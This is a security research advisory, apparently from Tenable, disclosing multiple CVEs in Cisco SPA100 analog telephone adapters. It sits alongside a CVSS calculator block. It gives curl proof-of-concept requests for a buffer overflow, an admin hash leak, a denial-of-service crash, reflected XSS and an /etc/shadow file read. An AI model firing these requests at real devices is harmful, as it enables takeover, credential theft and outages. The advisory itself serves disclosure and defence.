#### Description

A vulnerability in the web-based management interface of Cisco SPA100 Series Analog Telephone Adapters (ATAs) could allow an authenticated, remote attacker to cause a denial of service condition on an affected device. The vulnerability is due to improper validation of user-supplied requests to the web-based management interface. An attacker could exploit this vulnerability by sending a crafted request to the web-based management interface of an affected device. A successful exploit could allow the attacker to cause the device to stop responding, requiring manual intervention for recovery.

# Common Vulnerability Scoring System

| Choose the version of CVSS calculator:   Version 1  Version 2  Version 3  Version 3.1 |
| --- |
| Common Vulnerability Scoring System (CVSS) Online Calculator, version 3.0 |
| Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV: Local AV: Adjacent AV: Network AV: Physical  Select Attack Vector Parameters  Attack Complexity AC: Low AC: High  Select Attack Complexity Parameters  Privileges Required PR: None PR: Low PR: High  Select Privileges Required Parameters  User Interaction UI: Required UI: None  Select User Interaction Parameters  Scope S: Unchanged S: Changed  Select Scope Parameters  Confidentiality Impact C: None C: Low C: High  Select Confidentiality Impact Parameters  Integrity Impact I: None I: Low I: High  Select Integrity Impact Parameters  Availability Impact A: None A: Low A: High  Select Availability Impact Parameters    Base Score: 6.5 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   Select Exploit Code Maturity Parameters  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   Select Remediation Level Parameters  Report Confidence RC: Unknown  RC: Reasonable  RC: Confirmed  RC: Not Defined   Select Report Confidence Parameters     Temporal Score: 6.5 |
| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR: Low  CR: Medium  CR: Not Defined  CR: High   Select Confidentiality Requirement Parameters  Integrity Requirement IR: Low  IR: Medium  IR: Not Defined  IR: High   Select Integrity Requirement Parameters  Availability Requirement AR: Low  AR: Medium  AR: Not Defined  AR: High   Select Availability Requirement Parameters  Modified Attack Vector MAV: Local  MAV: Adjacent  MAV: Network  MAV: Physical  MAV: Not Defined   Select Modified Attack Vector Parameters  Modified Attack Complexity MAC: Low  MAC: High  MAC: Not Defined   Select Modified Attack Complexity Parameters  Modified Privileges Required MPR: None  MPR: Low  MPR: High  MPR: Not Defined   Select Modified Privileges Required Parameters  Modified User Interaction MUI: Required  MUI: None  MUI: Not Defined   Select Modified User Interaction Parameters  Modified Scope MS: Unchanged  MS: Changed  MS: Not Defined   Select Modified Scope Parameters  Modified Confidentiality MC: None  MC: Low  MC: High  MC: Not Defined   Select Modified Confidentiality Parameters  Modified Integrity MI: None  MI: Low  MI: High  MI: Not Defined   Select Modified Integrity Parameters  Modified Availability MA: None  MA: Low  MA: High  MA: Not Defined   Select Modified Availability Parameters    Environmental Score: 6.5 |

# Cisco SPA100 Series Multiple Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Tenable discovered multiple vulnerabilities in Cisco SPA100 Series.

#### CVE-2019-15240 - CVE-2019-15252: Multiple Buffer Overflows (Remote Code Execution)

Multiple buffer overflow vulnerabilities (on the stack and heap) can be triggered via a crafted HTTP request.
An authenticated attacker may exploit these to execute code remotely.

##### Proof of Concept

Note: This is just one way to trigger a buffer overflow.

```

curl -i -s -k -X $'POST' \
-H $'Host: 192.168.1.122' -H $'Content-Length: 188' -H $'Content-Type: application/x-www-form-urlencoded' \
--data-binary $'\x0d\x0asubmit_button=Remote_access&submit_type=del_remote&change_action=gozila_cgi&remove_id=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A' \
$'http://192.168.1.122/apply.cgi;session_id=f48ce7c27d0f652fd031191450819cbe'

```

We have also published a full exploit to our GitHub PoC repo (<https://github.com/tenable/poc/blob/master/cisco/spagett.py>).

#### CVE-2019-12708: Submit Button Arbitrary ASP Page Render Administrator Hash Leak Privilege Escalation

By sending a POST request to apply.cgi with a submit\_button value of 'User\_Level', an authenticated attacker
may reveal the admin password hashes. The admin hash will be in the body of the response, and this value
can be used to elevate privileges.

##### Proof of Concept

```

curl -i -s -k -X $'POST' \
-H $'Host: 50.71.132.182' -H $'Content-Length: 49' -H $'Content-Type: application/x-www-form-urlencoded' \
--data-binary $'submit_button=User_Level&change_action=gozila_cgi' \
$'http://50.71.132.182/apply.cgi;session_id=8bc7ff856b23540d2737e266b94640bd'

```
#### CVE-2019-15257: Configuration Backup Administrator Hash Leak Privilege Escalation

By performing an HTTP GET for /a.cfg, an encoded copy of the NVRAM configuration will be returned. This is trivial to decode and
includes the admin hash and cisco hash which you can use to log in. An authenticated attacker could exploit this
to escalate privileges.

#### CVE-2019-15258: Add Favorite Help Index Denial of Service

A authenticated request sent to apply.cgi with a value for 'help\_page' but without a 'help\_idx' will cause a crash. It causes a null pointer dereference in httpd. Device needs to be rebooted in order to get httpd running again.

##### Proof of Concept

```

curl -i -s -k -X $'POST' \
-H $'Host: 192.168.1.123' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 93' \
--data-binary $'submit_button=help/help&submit_type=fav_add&change_action=gozila_cgi&help_page=1' \
$'http://192.168.1.123/apply.cgi;session_id=a534c87e1fe5d0f49498cd9cbed1d4cd'

```
#### CVE-2019-12702: GUI Action Reflected Cross-Site Scripting

The apply.cgi 'gui\_action' POST parameter value is not validated prior to reflecting its value in the browser. An authenticated attacker
may exploit this to inject and execute malicious client-side JavaScript.

##### Proof of Concept

```

gui_action=--><script><img src=x onerror=alert(‘xss’)></script><!--

```
#### CVE-2019-12703: Stored Cross-Site Scripting via DHCP

The DHCP client (which runs on the SPA122’s “Internet” port, or the only port of the SPA112) accepts and displays the DHCP “domain-name” option in the Web UI without any escaping or validation, leading to XSS.
A malicious DHCP server could use this to steal administrator credentials, if the administrator logs on and views the malicious DHCP server configuration, which includes Javascript in the domain-name parameter.
The XSS is triggered by visiting Status > System Information page.

The SPA122’s DHCP server (SPA112 does not have this feature) will accept and display DHCP client hostnames in the Web UI, leading to XSS. An attacker could exploit this by sending a crafted DHCP client hostname. The XSS can be triggered by visiting Status > DHCP Server Information.

#### CVE-2019-12704: Next Page Arbitrary File Disclosure

The next\_page parameter value can be crafted to reveal the contents of an arbitrary file path on disk. This
may be exploited by an authenticated attacker.

Note: this can also be used to elevate privileges by reading /www/User\_Level.asp.

##### Proof of Concept:

```

curl -i -s -k -X $'POST' \
-H $'Host: 192.168.1.122' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 81' \
--data-binary $'submit_button=hax&submit_type=hax&change_action=gozila_cgi&next_page=/etc/shadow' \
$'http://192.168.1.122/apply.cgi;session_id=73320cc2a9534cfeb0e6141f9ed52bb8'

```
